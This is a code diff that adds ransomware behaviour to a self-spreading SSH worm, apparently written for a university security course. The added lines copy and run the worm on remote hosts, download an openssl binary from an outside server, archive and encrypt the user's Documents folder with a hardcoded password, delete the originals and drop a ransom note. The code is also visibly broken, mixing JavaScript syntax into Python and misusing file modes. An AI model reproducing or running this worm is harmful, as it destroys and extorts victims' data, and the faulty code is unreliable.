@@ -6,7 +6,10 @@ import netifaces
 import os
 import sys
 import fcntl, struct
-
+import urllib
+import shutil
+import tarfile
+from subprocess import call
 
 
 # The list of credentials to attempt
@@ -26,9 +29,10 @@ def isInfectedSystem():
 	# you created when you marked the system
 	# as infected). 
     try:
-        remotepath = '/tmp/infected.txt'
-        localpath = '/home/cpsc/'
-        sftp.get(filepath, localpath)
+	f = open("/tmp/infected.txt","r")
+	f.write("Name Was Here")
+	f.close()
+       
     except IOError:
 	    print "This system should be infected"
 	    return false
@@ -56,9 +60,48 @@ def spreadAndExecute(sshClient):
 	# The code which goes into this function
 	# is very similar to that code.	
 	sshClient.put("worm.py","/tmp/"+"worm.py")
-	ssh.exec_command("python /tmp/worm.py")
+	sshClient.exec_command("python /tmp/worm.py")
+	##Download Something like Justin Beiber Song But that would be illegal even for worm purposes but we gonna download ssl instead to encrpyt for money
+	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl")
+	#source :
+	var path = os.path.expanduser('~/Documents')
+
+	#with tarfile.open(usrtar,"w:gz") as tar:
+	#	tar.add(path,arcname=os.path.basename(path))
+	tar = tarfile.open("usrtar.tar", "w:gz")
+
+	# Add the exdir/ directory to the archive
+	tar.add(path)
+
+	# Close the archive file
+	tar.close()
+
+	##Copy the usr DOC
+
+	##encryt the usr Doc  to a tar
+	call(["chmod", "a+x", "./openssl"])
+
+	# The code below is equivalent to running line:
+	# openssl aes-256-cbc -a -salt -in secrets.txt -out secrets.txt.enc
+	# from the shell prompt. 
+	# You do not need to understand the details of how
+	# this program works. Basically, "runprog.py" is the
+	# input file to the program which we would like to
+	# encrypt, "runprog.py.enc" is the output file 
+	# containing encrypted contents of file 
+	# "runprog.py.enc" and "pass" is the password.
+	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "usrtar.tar", "-out", "usrtar.tar.enc", "-k", "cp456worm"])
+
+	##Delete the usr doc file
+	shutil.rmtree(path)
+
+	##Create a ransome Notes
+	f= open("READMEUSRFILE.txt","W")
+	f.write("I Need a Dollar"\n)
+	f.close()
 
 	pass
+
 def tryCredentials(host, userName, password, sshClient):
 	
 	# Tries to connect to host host using
